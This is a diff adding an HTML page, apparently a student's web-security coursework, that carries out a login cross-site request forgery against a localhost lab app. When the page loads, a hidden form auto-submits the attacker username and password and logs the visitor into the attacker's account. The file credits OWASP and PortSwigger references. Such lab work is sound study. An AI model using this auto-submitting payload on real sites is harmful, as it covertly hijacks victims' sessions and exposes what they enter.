@@ -1,0 +1,22 @@
+<!-- 
+    List of people I discussed the project with: Yuchan Kim, Seungwon Burm
+
+    List of references used:
+    1. https://owasp.org/www-community/attacks/csrf
+    2. https://portswigger.net/web-security/csrf
+    3. https://support.detectify.com/support/solutions/articles/48001048951-login-csrf
+-->
+<html>
+    <body>
+        <iframe style="display:none" name="csrf-part0"></iframe>
+        <form target="hidden" method="POST" action="http://localhost/project2/login" id="csrf-part0" style="display:none">
+            	<input type="hidden" name= "username" value="adversary"/>
+		        <input type="hidden" name= "password" value="h4ck3r"/>
+		
+           	<input id="submit_form" type="submit">
+        </form>
+        <script> 
+		document.getElementById("csrf-part0").submit();
+	</script>
+    </body>
+</html>
